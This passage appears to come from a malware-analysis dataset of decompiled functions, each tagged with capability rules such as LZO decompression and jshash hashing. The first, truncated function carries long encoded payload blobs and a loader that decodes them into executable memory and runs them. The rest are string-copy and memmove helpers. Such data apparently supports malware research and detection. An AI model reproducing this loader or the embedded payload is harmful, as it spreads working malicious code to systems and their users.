\"j+e8/46wYqUrHG/dfVipMA9vh2zCjn9MVMVeyNiC8X/MgT4pQrI/Y0w474B+pr0dy1pZC0tQZXXUKvB7Cgg+at+Zfr1ma8lfy5ehU5IsQTBjtj64YJK/5BOSduHjUAzgYOCpH/8wpAMpQCPRwsVpZay1nQ04QW3y7lFNw6fJ9Y5L5eQp4ut3KzU3MQzdc9YoDklOCKx8Pj/hZ6g3ntm+AM1cj9DLI/EpuRJCNX7qC4ov0iAr2hjYiIgYsOCI4DhnzwEOFvrHl1NnenxFumkip5vCf1hFz4TQBVnWwkNyj4r8a9vLgE9oHT8nyKAwTJolDyUAaams5LC1rBis5BzgKQ5JTiyyaiwqvgnDdqqnagYpgs5QGNmwDKNjMqkZKK1S6BRx1fhDKiZTJDlsc6R1MsrOFrjAz6Cz1T2pGwZIb27KjD8byfydKhVC57C1rBh7nrH2VHo6Lxu3Nnxltjnq0uD4GBqy3IsO9uASRvjlcW4pH3RiA3TD1FOX5rUSsbCEVxh1z/6NFcxafVpC+QbuZODYo0U4BZC44BrR4DHeEuFVlL1KEfwEoplWb2n+NmSeM10mtdU1Ml6uUO3rfsZWi0Cp0WxTp1TVS4bOy5wAAn8IWqIG0yJ5aHgjFEC9JuW0UJnasn29A8rXx0hFrX3fbCeyogZ+2J8OzMexhXbnWbClqFiQqPiQiIgYsOCI4DhhzwEOMPLelEJiFQdOhs1VtbnIsKf16zWzzo+nmQTIYh27jZFqZh7dFJrX63epNbpY8rWmTJsjRwWqdSAT8t3VznTIMnuFMETx\"\n    ;\n    puStack1212 = &stack0xfffffb60;\n    puStack1216 = &stack0xfffffb7c;\n    pcStack1220 = 0x40732f;\n    puStack1216 = fcn.00401091();\n    pcStack1208 = 0xffffffff;\n    puStack1212 = NULL;\n    pcStack1220 = 0x40733f;\n    fcn.004011db();\n    if (0xf < puStack1144) {\n        pcStack1220 = puStack1164;\n        puStack1224 = 0x40734f;\n        fcn.0040b0dd();\n    }\n    pcStack1220 = \n    \"bx71E2M12lJQbez71++XKJWaGbQzBC2nJAynkKj4kIiIGLDgiOA4Yc8BDgLs3ZtMYGcqB7IKN/WeORurWjn5jiscXYmF79nE3TKl70AdN3KQITecx3L3XwP3aQmysPe2IHTp/oTK0ScOSU5G8yA2oknNSkoCq57o4OvbPdKjUApbxbgkt0fY5yNgUUa4R7fCYAwtBvr+aw1pQjw3HYHmoihyW9RQ49i/98ETEbyOXiket6nuXuZFdaPRc4mzPCo/9G7XsMnRiIxF5OaHTfnFukfqVNhK9CnCqQp8ahAzEkJYddtEOoLxK3hqbmgeIxB8S4Shbdx9EyUWIwRdWHvVQT3a5i01fnUlBy5PcVTeoCTOeVB9HSgdRwA6xkIghOB1I2dybQY1EHhZkawoxm9QZBE0HQUHb8dFMZu4KiB8eWgEbl9gSoGrM4R5CHsNJQhaWH7dQiCZ5iB4eX19CipZcRSapTLAJg5sCCkOXVhmxl4zhPU0eGppewggUHAUnaInyyYOehkyUE8betBUJoW4KjxrcGVFO1l5VJ2zbdtlCWccNVBIEHzBQiDa4DY6a24lHS5eOUudtjXNblBlFykMBQR5x0V4guwteGd/ZgcxEHxWhqEthGMSeh0yUEQbYNEdJpPkNiZ6byUdMF85WpO3JMwmC2AVahBcGXTRQ3iA/TY4a2glDS1ROV2TtziEaQp9VCUZRwBzxh0xgPE3eHx5aA0jUnEUiq0v2H8IJRUjEQUXY9FCeJr1IDF8MH0GLVBmFIWiJYR4CWcWLxJOWHvVWDja8zwneml7\"\n    ;\n    puStack1224 = &stack0xfffffb54;\n    puStack1228 = &stack0xfffffb70;\n    pcStack1232 = 0x407366;\n    puStack1228 = fcn.00401091();\n    pcStack1220 = 0xffffffff;\n    puStack1224 = NULL;\n    pcStack1232 = 0x407376;\n    fcn.004011db();\n    if (0xf < puStack1156) {\n        pcStack1232 = puStack1176;\n        puStack1236 = 0x407386;\n        fcn.0040b0dd();\n    }\n    pcStack1232 = \n    \"DG5RfEuRpWssrzoGgD67Lz05ob8WFGZQh7uVUHMKMiEHbfn4dORYsKSoWJCo+JAwVPaUAcseYPC3dYuqt4SUBaCAdJ63xuRsIYJmQAU+57qRxb+wtawYrOQc4Ph05FgAeEZ8DAdKkUJ6k+w8USnFrMp1uS4NOnnSRw8Ok2j2J0BvPQX1L7r+4IjgOLC1rBg4OPLEEudMKF45FDl1OX/XQzuF+z8gUktgByZTYkuuhzTaeBlnDBAZWwd/218IpOE37p8C+gJpUtE1tC9dzaoTaQZ52dfmtsEGIAt729otwnL/G2D95jop+HTkWLCkqFhedRa0VDqR/TcxInpgBytPfRSfpSbGYxpwVDQZWhVm3R0lg/ErLSJvYgAyEGJNkK1t23wfelQ0E1wAc8YdN4TtKSBhMGsIIVdgSN6sIMZ5UHEbKlBKG3iYVDCf4DA7YDB+ACZZOVSdpSXJJghhHSsZWlhlzVJ4hv03PyJoewgsEH5Qn6EzhGkUcVQjBEoRephXO5ngdSNteSUILlB6T960LclzUHkNJBBAB36YVyOS5nUkfHl5RS9PZUyXtiyEZBN5VCIZTx140R03nvsrMSJvYQUyEHhZmaEzhHoOZhtqH0gEOsBeJNrgODZieX1FMVVvXYHoNsF+FGYNMlBZEXiYVTWF+Ss3InFmHycQdlWC6DPNaA5oFiJQWR1u0V14l/ItMXwwegQxEHhRnK0s3WdQfBU+UEoEescdIJf6PjFgaCUbJ09iFJGoINt5UGoXKhNbBzrTVDqT5jA3InBgCidSZl3eqSfNeA5m\"\n    ;\n    puStack1236 = &stack0xfffffb48;\n    puStack1240 = &stack0xfffffb64;\n    pcStack1244 = 0x40739d;\n    puStack1240 = fcn.00401091();\n    pcStack1232 = 0xffffffff;\n    puStack1236 = NULL;\n    pcStack1244 = 0x4073ad;\n    fcn.004011db();\n    if (0xf < puStack1168) {\n        pcStack1244 = puStack1188;\n        puStack1248 = 0x4073bd;\n        fcn.0040b0dd();\n    }\n    pcStack1244 = \n    \"CmoXTQc631QtkvE/eG19awUnWx+ZvqJ3qUv1tkYOqcDq9hzAGFC+g9S69WL8aaSs5Bzg+HTkWAx4RnwMB0qRQkZLMrJc/76rQ0Npn50FU9S2FJk0p3O30H7lqGB+QmUYX34isLWsGBI48sRk21VZOUAe3cmLQu9L05diOZQPrrC1rBis5BzgLO4aE0IbJTEbBj3tyKX9JQ4JS5ZGwNB7BGq92q/zMhXh0FTenA2+1R1J83nbFxG5hApLJViPgAxCY/3KEM8W+PAWZziIiBiw4IjgOLC1rBit5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsBhEoDiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDg\"\n    ;\n    puStack1248 = &stack0xfffffb3c;\n    puStack1252 = &stack0xfffffb58;\n    pcStack1256 = 0x4073d4;\n    puStack1252 = fcn.00401091();\n    pcStack1244 = 0xffffffff;\n    puStack1248 = NULL;\n    pcStack1256 = 0x4073e4;\n    fcn.004011db();\n    if (0xf < puStack1180) {\n        pcStack1256 = puStack1200;\n        puStack1260 = 0x4073f4;\n        fcn.0040b0dd();\n    }\n    pcStack1256 = \n    \"iOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrPQc4HR05FiulIRo2ZikoO64ZIBCuCQIW4VSKKfVPtH4RtJr1Jdna7ucv6TWvJqEQbwpDGKBcixb0OLU7kHNbYeRlm1TnxanCrAEidSxtgHFjCkhDd3o3OxJ+WXomcRlHJVvrTS1wI0/tQ8FSIiXJgraLd+VS2xnIJsBZyaXR69Ft8uPPrcJB1+KrBisxBzggHTkWLCUvWiymNCgubhYgKa4tAjqhcwoytRy0IxELGh+lFFob5j0oZq5I4FauSAJWIRCKVDVFtLj\"\n    ;\n    puStack1260 = &stack0xfffffb30;\n    puStack1264 = &stack0xfffffb4c;\n    pcStack1268 = 0x40740b;\n    puStack1264 = fcn.00401091();\n    pcStack1256 = 0xffffffff;\n    puStack1260 = NULL;\n    pcStack1268 = 0x40741b;\n    fcn.004011db();\n    if (0xf < puStack1192) {\n        pcStack1268 = puStack1212;\n        puStack1272 = 0x40742b;\n        fcn.0040b0dd();\n    }\n    pcStack1268 = \n    \"RpFqNpYQapubxqPNu6yDXrsXC6qB7CzF0GzVj0FjbT6RdW15ncWnY7/vh92xHgE5j7MjB9mZ3mVK5FiwlKhYoKj4kIq4A4DduIQLc4bcLK/RsNUFQeBu9pLlbsmemKY/vpaLfrPJBLKKgSespBzgwHTkWAOUb2hNmMGjyLtDg0+/ggHBjFAhOt6w2kRORWPKmYhmFpY2rpi3K4+kt2EHJ4oBJ6y0HODAdORYaZaIa9mbgaMcuyWGo75ODwWCzCbI2nTelEqUZsSa0GbslniuDLYwj9G3JQdWiqwYrIQc4MB05FiylOxoVpgzoFi4wIA9uAMIW4VeKJXVXNGCRWFpGpVeaeuacKIQuriCSrpPClKKrBislBzg6HTkWG6VTWlgmQOhiAgYsPyI4DhFgdYtLdGQ1W9Bxmd6m3lnTJcfr4gYGLD8iOA41oOuIaXdCNnnTaphWJ1HYWqR+qqIKBiwmIjgOPiFFCgT1NbQLUTYb0KTUW+UkPeoybBtiGSwewAXjRogYtzJ2AxM5GG/nY9hvpG1qdGxcIlhsWgBGIwCIXrdwNkaTRRhRp1WYZSS8qqYsjqKpLISApiO7CPq303bZE9fY3WfcWN/k+2sk7Q2jNS04DiwBawYnOQc4HxFAGPFmiJmM5ZLrjS2044AthEGqIqBJ+zbTt+lS4Nnz5suZ2OX+JCISBiw/IngOLCFpii61DzQ0kTeaOGU9WjimHagKbizgFC4Wwhmhb0psNU70dZFqGntlSlpCJlMoTK514EBuRAJSoSsKqrWEdLsRtBqjpbJaj2aQKJB\"\n    ;\n    puStack1272 = &stack0xfffffb24;\n    puStack1276 = &stack0xfffffb40;\n    puStack1276 = fcn.00401091();\n    pcStack1268 = 0xffffffff;\n    puStack1272 = NULL;\n    fcn.004011db();\n    if (0xf < puStack1204) {\n        fcn.0040b0dd(puStack1224);\n    }\n    puVar4 = fcn.00401091(&stack0xfffffb34, &stack0xfffffb18, \n                          \"uteC6rv4C+WGzysh17nTV0cxa1uXg2ygnKSk5LydhC+85Q3vgMAt39GL1VRBWm17kUVtZp37poK+MIbdvqYO5IPLLsLSadZ9QgRuR5Kob5yf6qeyv1iHpr+3D3iCdy9c0+HX7EzQYP+c8GDxkIyo8rCWiHWwRQBKjT4hH9382RFNFmGXnodi2JK2qv2yiopasiACdI9nIkzeFNuCT2ZjBJ9/Y22U862qtTWNvLUhBXqIfiVA2Rfe2ErOZvOa5WbKlpyu/LYYsOCo4Ti8tawYrNQc4Ph05FiwpKhYkKj4kOzpbtXg\"\n                         );\n    fcn.004011db(puVar4, 0, 0xffffffff);\n    if (0xf < puStack1216) {\n        fcn.0040b0dd(puStack1236);\n    }\n    puStack1272 = NULL;\n    puStack1276 = NULL;\n    puVar5 = puStack1264;\n    if (pcStack1244 < 0x10) {\n        puVar5 = &stack0xfffffb10;\n    }\n    cVar1 = fcn.0040101e(&stack0xfffffb08, &stack0xfffffb04, puVar5, puStack1248);\n    if (cVar1 == '\\0') {\n        fcn.004011d1();\n        return 0;\n    }\n    puVar6 = (*pcVar3)(0, puStack1276, 0x1000, 0x40);\n    puVar7 = puVar6;\n    for (uVar9 = unaff_EBP >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {\n        *puVar7 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (uVar9 = unaff_EBP & 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n        *puVar7 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    iVar2 = fcn.004011a9(&stack0xfffffb18, 0x18d, 0);\n    if (*(iVar2 + 0x18) < 8) {\n        iVar2 = iVar2 + 4;\n    }\n    else {\n        iVar2 = *(iVar2 + 4);\n    }\n    fcn.00401262(iVar2, puVar6, unaff_EBP);\n    fcn.004011e0();\n    (*puVar6)();\n    fcn.004011d1();\n    return 0;\n}\n",
        "token_count": 74808
    },
    "004011bd": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004011bd(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint *puVar6;\n    uint unaff_EDI;\n    int32_t unaff_retaddr;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.00408cf6();\n    }\n    uVar1 = *(param_2 + 0x14) - param_3;\n    uVar4 = param_4;\n    if (uVar1 < param_4) {\n        uVar4 = uVar1;\n    }\n    if (-*(param_1 + 0x14) - 1U <= uVar4) {\n        fcn.00408d91();\n    }\n    if (uVar4 != 0) {\n        uVar1 = *(param_1 + 0x14) + uVar4;\n        if (uVar1 == 0xffffffff) {\n            fcn.00408d91();\n        }\n        if (*(param_1 + 0x18) < uVar1) {\n            fcn.0040113b(uVar1, *(param_1 + 0x14), unaff_EBP, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, \n                         param_3, param_4);\n        }\n        else if (uVar1 == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (uVar1 != 0) {\n            if (*(param_2 + 0x18) < 0x10) {\n                param_2 = param_2 + 4;\n            }\n            else {\n                param_2 = *(param_2 + 4);\n            }\n            puVar5 = param_1 + 4;\n            puVar2 = puVar5;\n            if (0xf < *(param_1 + 0x18)) {\n                puVar2 = *puVar5;\n            }\n            puVar6 = unaff_retaddr + param_2;\n            puVar2 = *(param_1 + 0x14) + puVar2;\n            for (uVar3 = uVar4 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar2 = *puVar6;\n                puVar6 = puVar6 + 1;\n                puVar2 = puVar2 + 1;\n            }\n            for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *puVar2 = *puVar6;\n                puVar6 = puVar6 + 1;\n                puVar2 = puVar2 + 1;\n            }\n            *(param_1 + 0x14) = uVar1;\n            if (0xf < *(param_1 + 0x18)) {\n                puVar5 = *puVar5;\n            }\n            *(puVar5 + uVar1) = 0;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 820
    },
    "004011db": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004011db(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t noname_0;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint unaff_EDI;\n    int32_t *piVar4;\n    uint unaff_retaddr;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.00408cf6();\n    }\n    noname_0 = *(param_2 + 0x14) - param_3;\n    if (param_4 < noname_0) {\n        noname_0 = param_4;\n    }\n    if (param_1 != param_2) {\n        if (noname_0 == 0xffffffff) {\n            fcn.00408d91();\n        }\n        if (*(param_1 + 0x18) < noname_0) {\n            fcn.0040113b(noname_0, *(param_1 + 0x14), unaff_EDI, unaff_ESI, unaff_EBP, unaff_EBX, unaff_retaddr, param_2\n                         , param_3, param_4);\n        }\n        else if (noname_0 == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (noname_0 != 0) {\n            if (*(param_2 + 0x18) < 0x10) {\n                param_2 = param_2 + 4;\n            }\n            else {\n                param_2 = *(param_2 + 4);\n            }\n            piVar1 = param_1 + 4;\n            piVar4 = piVar1;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar4 = *piVar1;\n            }\n            puVar3 = param_3 + param_2;\n            for (uVar2 = noname_0 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *piVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            for (uVar2 = noname_0 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *piVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            *(param_1 + 0x14) = noname_0;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar1 = *piVar1;\n            }\n            *(piVar1 + noname_0) = 0;\n        }\n        return param_1;\n    }\n    fcn.00401104(noname_0 + param_3, 0xffffffff);\n    fcn.00401104(0, param_3);\n    return param_1;\n}\n",
        "token_count": 784
    },
    "00401230": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00401230(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t noname_0;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint unaff_EDI;\n    uint *puVar4;\n    uint unaff_retaddr;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.00408cf6();\n    }\n    noname_0 = *(param_2 + 0x14) - param_3;\n    if (param_4 < noname_0) {\n        noname_0 = param_4;\n    }\n    if (param_1 == param_2) {\n        fcn.004011cc(noname_0 + param_3, 0xffffffff);\n        fcn.004011cc(0, param_3);\n        return param_1;\n    }\n    if (0x7ffffffe < noname_0) {\n        fcn.00408d91();\n    }\n    if (*(param_1 + 0x18) < noname_0) {\n        fcn.0040123f(noname_0, *(param_1 + 0x14), unaff_EDI, unaff_ESI, unaff_EBP, unaff_EBX, unaff_retaddr, param_2, \n                     param_3, param_4);\n    }\n    else if (noname_0 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (7 < *(param_1 + 0x18)) {\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        *(param_1 + 4) = 0;\n        return param_1;\n    }\n    if (noname_0 != 0) {\n        if (*(param_2 + 0x18) < 8) {\n            param_2 = param_2 + 4;\n        }\n        else {\n            param_2 = *(param_2 + 4);\n        }\n        if (*(param_1 + 0x18) < 8) {\n            puVar4 = param_1 + 4;\n        }\n        else {\n            puVar4 = *(param_1 + 4);\n        }\n        uVar1 = noname_0 * 2;\n        puVar3 = param_2 + param_3 * 2;\n        for (uVar2 = uVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        for (uVar2 = uVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        *(param_1 + 0x14) = noname_0;\n        if (7 < *(param_1 + 0x18)) {\n            *(uVar1 + *(param_1 + 4)) = 0;\n            return param_1;\n        }\n        *(uVar1 + param_1 + 4) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 806
    },
    "0040123f": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040123f(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint32_t var_8h;\n    int32_t var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x41f6c0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar4 = var_8h | 7;\n    if (uVar4 < 0x7fffffff) {\n        uVar1 = *(in_ECX + 0x18);\n        uVar3 = uVar1 >> 1;\n        var_8h = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= 0x7ffffffe - uVar3)) {\n            var_8h = uVar3 + uVar1;\n        }\n    }\n    var_4h = 0;\n    puVar2 = fcn.00408bd1(var_8h * 2 + 2);\n    if (var_ch != 0) {\n        if (*(in_ECX + 0x18) < 8) {\n            puVar5 = in_ECX + 4;\n        }\n        else {\n            puVar5 = *(in_ECX + 4);\n        }\n        puVar6 = puVar2;\n        for (uVar4 = var_ch * 2 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        for (uVar4 = var_ch * 2 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    if (7 < *(in_ECX + 0x18)) {\n        fcn.0040b0dd(*(in_ECX + 4));\n    }\n    puVar5 = in_ECX + 4;\n    *puVar5 = 0;\n    *puVar5 = puVar2;\n    *(in_ECX + 0x18) = var_8h;\n    *(in_ECX + 0x14) = var_ch;\n    if (7 < var_8h) {\n        puVar5 = puVar2;\n    }\n    *(puVar5 + var_ch * 2) = 0;\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 733
    },
    "00401267": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00401267(int32_t param_1, uint *param_2, uint32_t param_3, uint param_4)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t uVar5;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    uVar5 = *(param_1 + 0x18);\n    if (uVar5 < 0x10) {\n        puVar1 = param_1 + 4;\n    }\n    else {\n        puVar1 = *(param_1 + 4);\n    }\n    if (puVar1 <= param_2) {\n        puVar1 = param_1 + 4;\n        puVar3 = puVar1;\n        if (0xf < uVar5) {\n            puVar3 = *puVar1;\n        }\n        if (param_2 < *(param_1 + 0x14) + puVar3) {\n            if (0xf < uVar5) {\n                puVar1 = *puVar1;\n            }\n            iVar2 = fcn.004011bd(param_1, param_2 - puVar1, param_3);\n            return iVar2;\n        }\n    }\n    if (-*(param_1 + 0x14) - 1U <= param_3) {\n        fcn.00408d91();\n    }\n    if (param_3 != 0) {\n        uVar5 = *(param_1 + 0x14) + param_3;\n        if (uVar5 == 0xffffffff) {\n            fcn.00408d91();\n        }\n        if (*(param_1 + 0x18) < uVar5) {\n            fcn.0040113b(uVar5, *(param_1 + 0x14), unaff_EBP, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, \n                         param_3, param_4);\n        }\n        else if (uVar5 == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (uVar5 != 0) {\n            if (*(param_1 + 0x18) < 0x10) {\n                iVar2 = param_1 + 4;\n            }\n            else {\n                iVar2 = *(param_1 + 4);\n            }\n            puVar1 = *(param_1 + 0x14) + iVar2;\n            for (uVar4 = param_3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *puVar1 = *param_2;\n                param_2 = param_2 + 1;\n                puVar1 = puVar1 + 1;\n            }\n            for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {\n                *puVar1 = *param_2;\n                param_2 = param_2 + 1;\n                puVar1 = puVar1 + 1;\n            }\n            *(param_1 + 0x14) = uVar5;\n            if (0xf < *(param_1 + 0x18)) {\n                *(*(param_1 + 4) + uVar5) = 0;\n                return param_1;\n            }\n            *(param_1 + 4 + uVar5) = 0;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 874
    },
    "0040ada0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040ada0(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x0040af64;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x40b088\n            switch(*((arg_10h & 3) * 4 + 0x40b088)) {\n            case 0x40b0a0:\ncode_r0x0040b0a0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x40b0b0:\ncode_r0x0040b0b0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x40b0c4:\ncode_r0x0040b0c4:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x40b088\n            switch(*(arg_10h * 4 + 0x40b088)) {\n            case 0x40b0a0:\n                goto code_r0x0040b0a0;\n            case 0x40b0b0:\n                goto code_r0x0040b0b0;\n            case 0x40b0c4:\n                goto code_r0x0040b0c4;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x40af8c)) {\n            case 0x40af9c:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x0040af64:\n    // WARNING: Could not recover jumptable at 0x0040af66. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x40b038\n                    puVar1 = (**(uVar3 * -4 + 0x40b038))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40b088)) {\n                case 0x40b0a0:\n                    goto code_r0x0040b0a0;\n                case 0x40b0b0:\n                    goto code_r0x0040b0b0;\n                case 0x40b0c4:\n                    goto code_r0x0040b0c4;\n                }\n                break;\n            case 0x40afc0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x0040af64;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 